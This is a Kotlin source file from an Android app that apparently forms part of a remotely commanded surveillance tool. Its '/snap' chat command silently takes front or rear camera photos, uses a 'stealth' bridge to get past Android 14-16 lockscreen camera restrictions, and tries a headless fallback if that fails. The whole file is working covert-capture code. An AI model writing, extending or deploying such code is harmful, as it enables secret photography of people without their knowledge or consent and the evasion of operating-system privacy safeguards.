package com.izhaanintellect.pasa.commands

import android.content.Context
import android.util.Log
import com.izhaanintellect.pasa.camera.StealthCameraManager
import com.izhaanintellect.pasa.camera.StealthCaptureBridge
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import javax.inject.Singleton

/**
 * Handles silent camera snapshot capture.
 * Uses StealthCaptureBridge to transition to TOP process state on Android 14-16,
 * overcoming lockscreen sensor restrictions.
 */
@Singleton
class SnapCommand @Inject constructor(
    @ApplicationContext private val context: Context,
    private val cameraManager: StealthCameraManager
) : Command {

    override val name = "/snap"
    override val description = "Capture camera photo"
    override val usage = "/snap front | /snap back"

    companion object {
        private const val TAG = "PASA_Snap"
    }

    override suspend fun execute(args: List<String>, chatId: Long): CommandResult {
        val useFront = when (args.firstOrNull()?.lowercase()) {
            "back", "rear" -> false
            else -> true
        }

        val cameraLabel = if (useFront) "front" else "rear"
        Log.i(TAG, "Requesting photo from $cameraLabel camera")

        // 1. Primary path: StealthCaptureBridge (Activity in TOP state for Android 14-16 lockscreen)
        val captureResult = StealthCaptureBridge.capturePhoto(context, useFront, 12000L)
        val photoFile = captureResult.file

        if (photoFile != null && photoFile.exists() && photoFile.length() > 0) {
            return CommandResult(
                success = true,
                message = "📸 Photo captured from $cameraLabel camera.",
                photoFile = photoFile
            )
        }

        Log.w(TAG, "StealthCaptureBridge failed (${captureResult.error}), trying direct CameraX fallback")

        // 2. Secondary fallback: direct headless cameraManager
        val fallbackFile = try {
            cameraManager.capturePhoto(useFront)
        } catch (e: Exception) {
            Log.e(TAG, "Fallback cameraManager error", e)
            null
        }

        return if (fallbackFile != null && fallbackFile.exists() && fallbackFile.length() > 0) {
            CommandResult(
                success = true,
                message = "📸 Photo captured from $cameraLabel camera (fallback).",
                photoFile = fallbackFile
            )
        } else {
            val errorReason = captureResult.error ?: "Sensor busy or restricted while device is locked."
            CommandResult(
                success = false,
                message = "❌ Failed to capture photo from $cameraLabel camera: $errorReason\n\n" +
                        "<i>Tip: If the device is locked on Android 16, ensure \"Display Over Other Apps\" is allowed in PASA App Info.</i>"
            )
        }
    }
}
